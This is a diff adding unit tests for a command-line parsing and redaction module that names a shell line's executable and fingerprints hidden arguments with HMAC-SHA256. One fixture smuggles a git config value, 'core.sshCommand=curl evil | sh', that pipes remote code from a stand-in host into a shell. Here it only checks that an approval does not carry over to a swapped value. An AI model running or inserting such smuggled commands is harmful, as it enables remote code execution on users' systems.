@@ -122,6 +122,26 @@ describe("CommandLine.executable", () => {
     expect(CommandLine.executable(ChildProcess.make("mysql -phunter2", [], { shell: "/bin/zsh" }))).toBe("mysql")
   })
 
+  it("skips leading assignments, which carry credentials, and unquotes the program", () => {
+    const shell = (line: string) => CommandLine.executable(ChildProcess.make(line, [], { shell: true }))
+    expect(shell("PGPASSWORD=hunter2 psql -h db")).toBe("psql")
+    expect(shell("A='x y' B=\"p q\" C=a\\ b D= psql")).toBe("psql")
+    expect(shell("TOKEN=\"$(cat key) x\" curl")).toBe("curl")
+    expect(shell("'/opt/my tool/bin' --x")).toBe("/opt/my tool/bin")
+    expect(shell("\"/opt/my tool\"/bin --x")).toBe("/opt/my tool/bin")
+  })
+
+  it("names the shell when the program is not a plain word", () => {
+    const shell = (line: string) => CommandLine.executable(ChildProcess.make(line, [], { shell: true }))
+    expect(shell("$TOOL --token hunter2")).toBe("sh")
+    expect(shell("PASS=$(printf hunter2 ) psql")).toBe("sh")
+    expect(shell("PASS=hunter2; psql")).toBe("sh")
+    expect(shell("/opt/my\\ tool --x")).toBe("sh")
+    expect(shell("\"$HOME/bin/tool\" --x")).toBe("sh")
+    expect(shell("PGPASSWORD=hunter2")).toBe("sh")
+    expect(shell("")).toBe("sh")
+  })
+
   it("names one executable per pipeline stage", () => {
     const pipeline = ChildProcess.make("printf", ["a\nb\n"]).pipe(
       ChildProcess.pipeTo(ChildProcess.make("grep -e secret", [], { shell: true }))
@@ -155,6 +175,26 @@ describe("CommandLine.cwd and CommandLine.env", () => {
 })
 
 describe("CommandLine.resource", () => {
+  it("fingerprints a protected argument so one grant binds one hidden value", () => {
+    const resource = (secret: string, context?: CommandLine.ResourceContext) =>
+      CommandLine.resource(ChildProcess.make("git", ["-c", Redacted.make(secret), "fetch"]), context)
+    const approved = resource("user.name=x")
+    expect(approved).toMatch(/^git -c '<redacted:[0-9a-f]{16}>' fetch$/)
+    expect(resource("user.name=x")).toBe(approved)
+    expect(resource("core.sshCommand=curl evil | sh")).not.toBe(approved)
+    expect(resource("user.name=x", { redactionKey: new Uint8Array([1]) })).not.toBe(approved)
+    expect(approved).not.toContain("user.name")
+  })
+
+  it("fingerprints with HMAC-SHA256 under the redaction key (RFC 4231 cases 2 and 6)", () => {
+    const fingerprint = (key: Uint8Array, value: string) =>
+      CommandLine.resource(ChildProcess.make("x", [Redacted.make(value)]), { redactionKey: key })
+    expect(fingerprint(new TextEncoder().encode("Jefe"), "what do ya want for nothing?"))
+      .toBe("x '<redacted:5bdcc146bf60754e>'")
+    expect(fingerprint(new Uint8Array(131).fill(0xaa), "Test Using Larger Than Block-Size Key - Hash Key First"))
+      .toBe("x '<redacted:60e431591ee0b67f>'")
+  })
+
   it("equals the rendered line for argv commands and simple shell lines", () => {
     expect(CommandLine.resource(ChildProcess.make("git", ["status", "a;b"]))).toBe("git status 'a;b'")
     expect(CommandLine.resource(ChildProcess.make("git status --short", { shell: true }))).toBe("git status --short")
